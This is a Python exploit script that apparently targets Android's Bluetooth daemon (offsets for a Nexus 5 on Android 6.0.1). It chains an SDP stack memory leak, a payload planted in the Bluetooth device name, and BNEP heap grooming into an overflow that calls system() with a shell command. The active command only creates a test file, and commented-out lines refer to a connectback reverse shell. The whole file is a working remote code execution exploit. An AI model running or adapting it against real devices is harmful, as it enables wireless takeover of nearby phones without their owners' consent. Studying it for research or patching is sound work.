import os
import sys
import time
import struct
import select
import binascii

import bluetooth
from bluetooth import _bluetooth as bt

import bluedroid
import connectback

from pwn import log

LIBC_TEXT_STSTEM_OFFSET = 0x4669c+1 
LIBC_SOME_BLX_OFFSET = 0x1A0E1 # b56200e1-b5606000 in [17][5]

BSS_ACL_REMOTE_NAME_OFFSET = -0xD83E17
BLUETOOTH_BSS_SOME_VAR_OFFSET = 0xE0B6D # 9cc4fb6d-9cb6f000 in [2][7]
MAX_BT_NAME = 0xf8

# Payload details
SHELL_SCRIPT = b'touch /data/local/tmp/test'

PWNING_TIMEOUT = 8
BNEP_PSM = 15
PWN_ATTEMPTS = 1
LEAK_ATTEMPTS = 1

def print_result(result):
    i = 0
    for line in result:
      sys.stdout.write("%02d: " % i)
      for x in line:
        sys.stdout.write("%08x " % x) 
      else:
        sys.stdout.write("\n")
        i += 1


def set_bt_name(payload, src_hci, src, dst):
    # Create raw HCI sock to set our BT name
    raw_sock = bt.hci_open_dev(bt.hci_devid(src_hci))
    flt = bt.hci_filter_new()
    bt.hci_filter_all_ptypes(flt)
    bt.hci_filter_all_events(flt)
    raw_sock.setsockopt(bt.SOL_HCI, bt.HCI_FILTER, flt)

    # Send raw HCI command to our controller to change the BT name (first 3 bytes are padding for alignment)
    raw_sock.sendall(binascii.unhexlify('01130cf8') + payload.ljust(MAX_BT_NAME, b'\x00'))
    #os.system('sudo hciconfig %s name "%s"' % (src_hci,payload))
    raw_sock.close()
    time.sleep(1)
    #time.sleep(0.1)

    # Connect to BNEP to "refresh" the name (does auth)
    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.bind((src, 0))
    bnep.connect((dst, BNEP_PSM))
    bnep.close()

    # Close ACL connection
    os.system('hcitool dc %s' % (dst,))
    #time.sleep(1)


def set_rand_bdaddr(src_hci):
    addr = ['%02x' % (ord(c),) for c in os.urandom(6)]
    # NOTW: works only with CSR bluetooth adapters!
    os.system('sudo hcitool cmd 0x3f 0x001 0x%s 0x00 0x%s 0x%s 0x%s 0x00 0x%s 0x%s' %
              ( addr[3], addr[5], addr[4], addr[2], addr[1], addr[0]))
    final_addr = ':'.join(addr)
    log.info('Set %s to new rand BDADDR %s' % (src_hci, final_addr))
    time.sleep(1)
    #while bt.hci_devid(final_addr) < 0:
        #time.sleep(0.1)
    return final_addr



def memory_leak_get_bases(src, src_hci, dst):
    prog = log.progress('Doing stack memory leak...')

    # Get leaked stack data. This memory leak gets "deterministic" "garbage" from the stack.
    result = bluedroid.do_sdp_info_leak(dst, src)
    #print("Leak: %s" % result) # Debug, show leak array

    print_result(result)
    # Calculate according to known libc.so and bluetooth.default.so binaries
    #likely_some_libc_blx_offset = result[-3][-2]
    #likely_some_bluetooth_default_global_var_offset = result[6][0]

    # Nexus 5 6.0.1
    likely_some_libc_blx_offset = result[17][5]
    likely_some_bluetooth_default_global_var_offset = result[2][7]

    # Show leak address
    log.info("LIBC  0x%08x" % likely_some_libc_blx_offset)
    log.info("BT    0x%08x" % likely_some_bluetooth_default_global_var_offset)


    libc_text_base = likely_some_libc_blx_offset - LIBC_SOME_BLX_OFFSET

    bluetooth_default_bss_base = likely_some_bluetooth_default_global_var_offset - BLUETOOTH_BSS_SOME_VAR_OFFSET

    log.info('libc_base: 0x%08x, bss_base: 0x%08x' % (libc_text_base, bluetooth_default_bss_base))

    # Close SDP ACL connection
    os.system('hcitool dc %s' % (dst,))
    time.sleep(0.1)

    prog.success()
    return libc_text_base, bluetooth_default_bss_base


def pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, libc_text_base):
    # Gen new BDADDR, so that the new BT name will be cached
    #src = set_rand_bdaddr(src_hci)
    src = "E4:5E:37:2F:7A:3C"
    ptr0 = acl_name_addr

    #payload = struct.pack('<III', 0xAAAA1722, 0x41414141, system_addr) + b'";\n' + SHELL_SCRIPT + b'\n#'
    payload = struct.pack('<III', 0x41411722, 0x41414141, system_addr) + b'";\n' + SHELL_SCRIPT + b'\n#'
    #payload = SHELL_SCRIPT
    
    #x = acl_name_addr+4

    #shell_addr = x+24 # SHELL SCRIPT address
    #ptr0 = x+16  -4 # points to ptr0+4 (ptr1)
    #ptr1 = x+8   -8 # points to ptr1+8 (ptr2)
    #ptr2 = x+20 -28 # points to ptr2+28 (system_addr)

    #payload = 'A'+ struct.pack('<IIIIII', shell_addr, 0x41414141, ptr2, 0x42424242, ptr1, system_addr) + SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT)
    #payload = 'A'+ struct.pack('<IIIIII', shell_addr, ptr1, ptr2, ptr0, ptr1, system_addr) + SHELL_SCRIPT
    #payload = 'A' + 'X\x91\xd8\xdb@\x91\xd8\xdb8\x91\xd8\xdbL\x91\xd8\xdb@\x91\xd8\xdbEp\xe2\xf6' + SHELL_SCRIPT
    #payload = 'A' + SHELL_SCRIPT
    #payload = 'X'
    #print payload
    
    #log.info("shelladdr 0x%08x" % shell_addr)
    #log.info("ptr0      0x%08x" % ptr0)
    #log.info("ptr1      0x%08x" % ptr1)
    #log.info("ptr2      0x%08x" % ptr2)
    #log.info("system    0x%08x" % system_addr)
    
    #log.info("PAYLOAD %s" % payload)

    assert len(payload) < MAX_BT_NAME
    assert b'\x00' not in payload
    
    # Puts payload into a known bss location (once we create a BNEP connection).
    set_bt_name(payload, src_hci, src, dst)
    #prog = log.progress('Set name to '+payload)
    #time.sleep(30)

    prog = log.progress('Connecting to BNEP again')
    time.sleep(1)

    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.bind((src, 0))
    bnep.connect((dst, BNEP_PSM))

    prog.success()
    prog = log.progress('Pwning...')

    # Each of these messages causes BNEP code to send 100 "command not understood" responses.
    # This causes list_node_t allocations on the heap (one per reponse) as items in the xmit_hold_q.
    # These items are popped asynchronously to the arrival of our incoming messages (into hci_msg_q).
    # Thus "holes" are created on the heap, allowing us to overflow a yet unhandled list_node of hci_msg_q.
    
    for i in range(20):
        bnep.send(binascii.unhexlify('8109' + '800109' * 100))
        #bnep.send()

    # Repeatedly trigger the vuln (overflow of 8 bytes) after an 8 byte size heap buffer.
    # This is highly likely to fully overflow over instances of "list_node_t" which is exactly
    # 8 bytes long (and is *constantly* used/allocated/freed on the heap).
    # Eventually one overflow causes a call to happen to "btu_hci_msg_process" with "p_msg"
    # under our control. ("btu_hci_msg_process" is called *constantly* with messages out of a list)
    for i in range(1000):
        # If we're blocking here, the daemon has crashed
        _, writeable, _ = select.select([], [bnep], [], PWNING_TIMEOUT)
        if not writeable:
            break
        bnep.send(binascii.unhexlify('810100') +
                  struct.pack('<II', 0, ptr0))
    else:
        log.info("Looks like it didn't crash. Possibly worked")
    
    prog.success()

def main(src_hci, dst):
    #os.system('hciconfig %s sspmode 0' % (src_hci,))
    
    os.system('hciconfig %s down' % (src_hci))
    os.system('btmgmt ssp off')
    os.system('hciconfig %s up' % (src_hci))
    
    os.system('hcitool dc %s' % (dst,))

    #sh_s, stdin, stdout = connectback.create_sockets(NC_PORT, STDIN_PORT, STDOUT_PORT)

    for i in range(PWN_ATTEMPTS):
        log.info('Pwn attempt %d:' % (i,))

        # Create a new BDADDR
        #src = set_rand_bdaddr(src_hci)
        src = "E4:5E:37:2F:7A:3C"
        #print "TESTTESTTEST"
        #set_bt_name("TESTTEST", src_hci, src, dst) # Set Name, REMOTE_NAME address search
 

        # Try to leak section bases
        for j in range(LEAK_ATTEMPTS):
            libc_text_base, bluetooth_default_bss_base = memory_leak_get_bases(src, src_hci, dst)
            
            if (libc_text_base & 0xfff == 0) and (bluetooth_default_bss_base & 0xfff == 0):
                break
        else:
           #assert True
           assert False, "Memory doesn't seem to have leaked as expected. Wrong .so versions?"

        system_addr = LIBC_TEXT_STSTEM_OFFSET + libc_text_base
        #print "0x%08x" %(system_addr)
        acl_name_addr = BSS_ACL_REMOTE_NAME_OFFSET + bluetooth_default_bss_base
        #assert acl_name_addr % 4 == 0
        log.info('system: 0x%08x, acl_name: 0x%08x' % (system_addr, acl_name_addr))

        pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, libc_text_base)


if __name__ == '__main__':
    main(*sys.argv[1:])

